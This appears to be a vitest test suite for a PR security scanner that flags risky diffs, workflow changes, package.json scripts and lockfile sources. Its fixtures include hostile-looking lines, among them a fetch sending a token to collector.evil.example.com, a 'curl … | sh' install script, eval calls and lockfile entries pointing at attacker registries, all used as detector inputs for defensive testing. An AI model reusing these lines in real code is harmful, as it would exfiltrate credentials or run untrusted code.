/**
 * Behavior spec for the PR security scanner (scripts/security-scan.ts).
 *
 * Each rule family gets one test that observes the finding it must produce and
 * the near-miss it must NOT produce — a scanner that fires on legitimate Qoder
 * code gets disabled within a week, so the negatives are part of the contract.
 * Fixtures are hand-built minimal diffs, not recordings: the scanner's input is
 * git's own output format, pinned by diff.test.ts.
 */
import { describe, expect, it } from "vitest";
import {
  exitCodeFor,
  type Finding,
  formatFindings,
  parseArgs,
  readBaseline,
  scanPullRequest,
} from "../../scripts/security-scan.ts";

function patch(file: string, addedLines: string[], startAt = 1): string {
  return [
    `diff --git a/${file} b/${file}`,
    `--- a/${file}`,
    `+++ b/${file}`,
    `@@ -${startAt},0 +${startAt},${addedLines.length} @@`,
    ...addedLines.map((line) => `+${line}`),
    "",
  ].join("\n");
}

function scan(diffText: string, extra: Partial<Parameters<typeof scanPullRequest>[0]> = {}): Finding[] {
  return scanPullRequest({ diffText, ...extra });
}

function rules(findings: readonly Finding[], severity?: "fail" | "warn"): string[] {
  return findings
    .filter((finding) => severity === undefined || finding.severity === severity)
    .map((finding) => finding.rule);
}

describe("source-line rules (src/**)", () => {
  it("fails dynamic code execution and subprocess spawning in the published artifact", () => {
    const findings = scan(
      patch("src/protocol/stream.ts", [
        'import { execSync } from "node:child_process";',
        "const out = eval(userText);",
        "const fn = new Function(body);",
      ]),
    );
    expect(rules(findings, "fail")).toEqual(["SRC-CODE-EXECUTION", "SRC-CODE-EXECUTION", "SRC-CODE-EXECUTION"]);
    expect(findings[0].line).toBe(1);
  });

  it("fails a new outbound host and allows every Qoder domain", () => {
    const bad = scan(
      patch("src/auth/oauth.ts", ['await fetch("https://collector.evil.example.com/t", { body: token });']),
    );
    expect(rules(bad, "fail")).toContain("SRC-NEW-OUTBOUND-HOST");
    expect(bad.find((finding) => finding.rule === "SRC-NEW-OUTBOUND-HOST")?.detail).toContain(
      "collector.evil.example.com",
    );

    const good = scan(
      patch("src/region.ts", [
        'baseUrl: "https://api3.qoder.sh/",',
        'openApiUrl: "https://openapi.qoder.com.cn",',
        'manageUrl: "https://qoder.com",',
        'gateway: "https://gateway.qoder.com.cn/",',
      ]),
    );
    expect(rules(good, "fail")).toEqual([]);
  });

  it("fails a cleartext http:// destination even to a known host", () => {
    const findings = scan(patch("src/http.ts", ['const url = "http://qoder.com/account";']));
    expect(rules(findings, "fail")).toContain("SRC-PLAINTEXT-URL");
  });

  it("fails a credential-shaped env read and warns on an ordinary one", () => {
    const credential = scan(patch("src/catalog.ts", ["const pat = process.env.QODER_PERSONAL_ACCESS_TOKEN;"]));
    expect(rules(credential, "fail")).toContain("SRC-CREDENTIAL-ENV");

    const ordinary = scan(patch("src/debug.ts", ["export const enabled = process.env.QODER_DEBUG !== undefined;"]));
    expect(rules(ordinary, "fail")).toEqual([]);
    expect(rules(ordinary, "warn")).toContain("SRC-ENV-READ");
  });

  it("warns once per file on filesystem writes", () => {
    const findings = scan(patch("src/lifetime.ts", ["writeFileSync(path, body);", "writeFileSync(other, body);"]));
    expect(rules(findings, "warn").filter((rule) => rule === "SRC-FS-WRITE")).toHaveLength(1);
  });

  it("reports nothing for a benign feature diff shaped like PR #21", () => {
    const findings = scan(
      [
        patch("src/host-compat.ts", [
          'import * as hostAi from "@earendil-works/pi-ai";',
          "export function fallbackHyperlink(text: string, url: string): string {",
          // biome-ignore lint/suspicious/noTemplateCurlyInString: fixture reproducing a real source line verbatim
          "  return `\\x1b]8;;${url}\\x1b\\\\${text}\\x1b]8;;\\x1b\\\\`;",
          "}",
        ]),
        patch("src/protocol/queue.ts", [
          "export function parseQoderQueueState(body: string): QoderQueueState | undefined {",
          "  return findQueueState(JSON.parse(body), 0);",
          "}",
        ]),
      ].join("\n"),
    );
    expect(rules(findings, "fail")).toEqual([]);
    // Neither path is credential/signing/transport plumbing, so not even the
    // advisory path rule fires: a benign feature diff is silent.
    expect(rules(findings, "warn")).toEqual([]);
  });
  it("does not scan its own fixtures: tests and recorded fixtures are out of SRC scope", () => {
    // A fixture legitimately quotes the text the rules look for. Without this
    // exclusion the scanner fails on this very file, and the alternative (a
    // bypass comment) would be a hole any contributor could use.
    const findings = scan(
      patch("src/__tests__/security-scan.test.ts", [
        'const line = "const pat = process.env.QODER_PAT;";',
        'await fetch("https://collector.evil.example.com/t");',
        "eval(userText);",
      ]),
    );
    expect(findings).toEqual([]);

    const fixtures = scan(patch("src/__fixtures__/live/chat.sse", ['data: {"code":"403"}']));
    expect(rules(fixtures, "fail")).toEqual([]);
  });

  it("reports an unreadable baseline instead of silently skipping the comparison", () => {
    const notes: string[] = [];
    expect(readBaseline("/definitely/not/here.json", notes)).toBeUndefined();
    expect(notes.join(" ")).toContain("could not be read");

    const empty: string[] = [];
    expect(readBaseline(undefined, empty)).toBeUndefined();
    expect(empty).toEqual([]);
  });
});

describe("workflow rules (.github/workflows/**)", () => {
  it("fails pull_request_target, secret access and permission escalation", () => {
    const findings = scan(
      patch(".github/workflows/ci.yml", [
        "on: pull_request_target",
        // biome-ignore lint/suspicious/noTemplateCurlyInString: GitHub Actions expression syntax, as a YAML fixture
        "        run: echo ${{ secrets.NPM_TOKEN }}",
        "  permissions:",
        "    id-token: write",
        "    contents: write",
      ]),
    );
    expect(rules(findings, "fail")).toEqual([
      "WF-PULL-REQUEST-TARGET",
      "WF-SECRETS-ACCESS",
      "WF-PERMISSION-ESCALATION",
      "WF-PERMISSION-ESCALATION",
    ]);
  });

  it("fails an unpinned action and accepts a SHA-pinned or local one", () => {
    const unpinned = scan(
      patch(".github/workflows/ci.yml", [
        "      - uses: actions/checkout@v4",
        "      - uses: some-org/evil-action@main",
      ]),
    );
    expect(rules(unpinned, "fail")).toEqual(["WF-UNPINNED-ACTION", "WF-UNPINNED-ACTION"]);

    const pinned = scan(
      patch(".github/workflows/ci.yml", [
        "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
        "      - uses: ./scripts/local-step",
        "      - run: npm ci",
      ]),
    );
    expect(rules(pinned, "fail")).toEqual([]);
  });

  it("ignores commented-out workflow lines", () => {
    const findings = scan(patch(".github/workflows/ci.yml", ["# on: pull_request_target", "#   secrets.NPM_TOKEN"]));
    expect(rules(findings, "fail")).toEqual([]);
  });
});

describe("manifest rules (package.json)", () => {
  const base = JSON.stringify({
    name: "@zenodinh/pi-provider-qoder",
    scripts: { test: "vitest run", prepublishOnly: "npm run check" },
    devDependencies: { vitest: "^5.0.1" },
  });

  it("fails an added or changed npm lifecycle script", () => {
    const added = scan("", {
      baseManifestText: base,
      headManifestText: JSON.stringify({
        scripts: { test: "vitest run", prepublishOnly: "npm run check", postinstall: "node ./x.js" },
      }),
    });
    expect(rules(added, "fail")).toContain("MANIFEST-LIFECYCLE-SCRIPT");

    const changed = scan("", {
      baseManifestText: base,
      headManifestText: JSON.stringify({ scripts: { test: "vitest run", prepublishOnly: "curl -s http://x.sh | sh" } }),
    });
    expect(rules(changed, "fail")).toContain("MANIFEST-LIFECYCLE-SCRIPT");
  });

  it("does not fire when the lifecycle script is untouched", () => {
    const findings = scan("", { baseManifestText: base, headManifestText: base });
    expect(rules(findings, "fail")).toEqual([]);
    expect(rules(findings)).toEqual([]);
  });

  it("warns on a changed dependency set, naming the additions", () => {
    const findings = scan("", {
      baseManifestText: base,
      headManifestText: JSON.stringify({
        scripts: { test: "vitest run", prepublishOnly: "npm run check" },
        devDependencies: { vitest: "^5.0.1", "vitesy-typo": "^1.0.0" },
      }),
    });
    expect(rules(findings, "warn")).toContain("MANIFEST-DEPENDENCY-CHANGED");
    expect(findings.find((finding) => finding.rule === "MANIFEST-DEPENDENCY-CHANGED")?.detail).toContain(
      "vitesy-typo@^1.0.0",
    );
  });

  it("degrades to a warning when the baseline is missing instead of calling every script new", () => {
    const findings = scan("", {
      headManifestText: JSON.stringify({ scripts: { test: "vitest run", prepublishOnly: "npm run check" } }),
    });
    expect(rules(findings, "fail")).toEqual([]);
    expect(rules(findings, "warn")).toEqual(["MANIFEST-BASELINE-MISSING"]);
  });

  it("advises on a root version bump and stays silent when the version is untouched", () => {
    const manifest = (version: string) =>
      JSON.stringify({ name: "@zenodinh/pi-provider-qoder", version, scripts: { test: "vitest run" } });

    const bumped = scan("", { baseManifestText: manifest("0.0.11"), headManifestText: manifest("0.0.12") });
    expect(rules(bumped, "warn")).toContain("MANIFEST-VERSION-BUMP");
    // A bump is a release *intent*, not a dangerous construct: advise, never block.
    expect(rules(bumped, "fail")).toEqual([]);
    expect(bumped.find((finding) => finding.rule === "MANIFEST-VERSION-BUMP")?.detail).toContain("0.0.11 -> 0.0.12");

    expect(scan("", { baseManifestText: manifest("0.0.11"), headManifestText: manifest("0.0.11") })).toEqual([]);
  });

  it("skips the manifest rules when the head manifest is absent or unparsable", () => {
    expect(scan("", { baseManifestText: base, headManifestText: "not json at all" })).toEqual([]);
    expect(scan("", { baseManifestText: base })).toEqual([]);
  });
});

describe("lockfile rules (package-lock.json)", () => {
  const baseLock = JSON.stringify({
    lockfileVersion: 3,
    packages: {
      "": { name: "root" },
      "node_modules/vitest": {
        version: "5.0.1",
        resolved: "https://registry.npmjs.org/vitest/-/vitest-5.0.1.tgz",
        integrity: "sha512-aaa",
      },
    },
  });

  it("fails a package resolving outside registry.npmjs.org", () => {
    const head = JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": { name: "root" },
        "node_modules/vitest": {
          version: "5.0.1",
          resolved: "https://registry.npmjs.org/vitest/-/vitest-5.0.1.tgz",
          integrity: "sha512-aaa",
        },
        "node_modules/left-pad": {
          version: "1.0.0",
          resolved: "https://npm.attacker.test/left-pad/-/left-pad-1.0.0.tgz",
          integrity: "sha512-bbb",
        },
      },
    });
    const findings = scan("", { baseLockText: baseLock, headLockText: head });
    expect(rules(findings, "fail")).toContain("LOCK-NON-NPM-REGISTRY");
  });

  it("fails a git, file or link source and a changed integrity on a known package", () => {
    const sources = scan("", {
      baseLockText: baseLock,
      headLockText: JSON.stringify({
        lockfileVersion: 3,
        packages: {
          "": { name: "root" },
          "node_modules/vitest": {
            version: "5.0.1",
            resolved: "https://registry.npmjs.org/vitest/-/vitest-5.0.1.tgz",
            integrity: "sha512-TAMPERED",
          },
          "node_modules/backdoor": { resolved: "git+https://github.com/attacker/backdoor.git#deadbeef" },
          "node_modules/local": { resolved: "file:../local-tarball.tgz", link: true },
        },
      }),
    });
    expect(rules(sources, "fail")).toEqual(
      expect.arrayContaining([
        "LOCK-INTEGRITY-CHANGED",
        "LOCK-NON-NPM-REGISTRY",
        "LOCK-NON-REGISTRY-SOURCE",
        "LOCK-LINKED-PACKAGE",
      ]),
    );
  });

  it("still fails a non-npm registry without a baseline, without calling every package new", () => {
    const head = JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": { name: "root" },
        "node_modules/vitest": {
          resolved: "https://registry.npmjs.org/vitest/-/vitest-5.0.1.tgz",
          integrity: "sha512-aaa",
        },
        "node_modules/evil": { resolved: "https://npm.attacker.test/evil/-/evil-1.0.0.tgz", hasInstallScript: true },
      },
    });
    const findings = scan("", { headLockText: head });
    expect(rules(findings, "fail")).toContain("LOCK-NON-NPM-REGISTRY");
    expect(rules(findings, "fail")).not.toContain("LOCK-NEW-INSTALL-SCRIPT");
    expect(rules(findings, "warn")).toEqual(
      expect.arrayContaining(["LOCK-BASELINE-MISSING", "LOCK-INSTALL-SCRIPT-UNVERIFIED"]),
    );
    expect(rules(findings, "warn")).not.toContain("LOCK-NEW-PACKAGES");
    // The same package can appear at several lock paths; one collapsed warning.
    expect(rules(findings, "warn").filter((rule) => rule === "LOCK-INSTALL-SCRIPT-UNVERIFIED")).toHaveLength(1);
  });

  it("fails a newly added package that runs an install script and lists new entries as a warning", () => {
    const head = JSON.stringify({
      lockfileVersion: 3,
      packages: {
        "": { name: "root" },
        "node_modules/vitest": {
          version: "5.0.1",
          resolved: "https://registry.npmjs.org/vitest/-/vitest-5.0.1.tgz",
          integrity: "sha512-aaa",
        },
        "node_modules/esbuild": {
          version: "0.28.2",
          resolved: "https://registry.npmjs.org/esbuild/-/esbuild-0.28.2.tgz",
          integrity: "sha512-ccc",
          hasInstallScript: true,
        },
        "node_modules/pure": {
          version: "1.0.0",
          resolved: "https://registry.npmjs.org/pure/-/pure-1.0.0.tgz",
          integrity: "sha512-ddd",
        },
      },
    });
    const findings = scan("", { baseLockText: baseLock, headLockText: head });
    expect(rules(findings, "fail")).toContain("LOCK-NEW-INSTALL-SCRIPT");
    const listed = findings.find((finding) => finding.rule === "LOCK-NEW-PACKAGES");
    expect(listed?.severity).toBe("warn");
    expect(listed?.detail).toContain("esbuild");
    expect(listed?.detail).toContain("pure");
  });
});

describe("path rules and CLI contract", () => {
  it("warns when credential, signing, transport or CI plumbing is touched", () => {
    const findings = scan(
      [
        patch("src/cosy.ts", ["const x = 1;"]),
        patch("package-lock.json", ["{}"]),
        patch("src/catalog.ts", ["const y = 2;"]),
      ].join("\n"),
    );
    const risky = findings.find((finding) => finding.rule === "PATH-HIGH-RISK");
    expect(risky?.severity).toBe("warn");
    expect(risky?.file).toContain("src/cosy.ts");
    expect(risky?.file).not.toContain("src/catalog.ts");
  });

  it("exits non-zero only on a blocking finding", () => {
    expect(exitCodeFor([{ severity: "warn", rule: "PATH-HIGH-RISK", file: "src/cosy.ts", detail: "d" }])).toBe(0);
    expect(
      exitCodeFor([{ severity: "fail", rule: "SRC-CODE-EXECUTION", file: "src/a.ts", line: 3, detail: "d" }]),
    ).toBe(1);
    expect(exitCodeFor([])).toBe(0);
  });

  it("renders a text verdict and github annotations", () => {
    const findings: Finding[] = [
      {
        severity: "fail",
        rule: "SRC-NEW-OUTBOUND-HOST",
        file: "src/a.ts",
        line: 9,
        detail: 'new outbound host "evil.test"',
      },
      { severity: "warn", rule: "PATH-HIGH-RISK", file: "src/cosy.ts", detail: "review" },
    ];
    expect(formatFindings(findings).split("\n").at(-1)).toBe("RESULT: FAIL");
    const github = formatFindings(findings, "github");
    expect(github).toContain("::error title=SRC-NEW-OUTBOUND-HOST file=src/a.ts:9::");
    expect(github).toContain("::warning title=PATH-HIGH-RISK::");
    expect(formatFindings([])).toContain("RESULT: PASS");
  });

  it("validates argv at the boundary", () => {
    expect(parseArgs(["--diff", "p.diff"])).toEqual({
      diff: "p.diff",
      format: "text",
      baseManifest: undefined,
      headManifest: undefined,
      baseLock: undefined,
      headLock: undefined,
    });
    expect(parseArgs(["--diff", "p.diff", "--format", "github"])).toMatchObject({ format: "github" });
    expect(() => parseArgs([])).toThrow(/--diff/);
    expect(() => parseArgs(["--diff", "p.diff", "--format", "yaml"])).toThrow(/must be "text" or "github"/);
    expect(() => parseArgs(["--diff", "p.diff", "--base-lock"])).toThrow(/missing value/);
  });
});
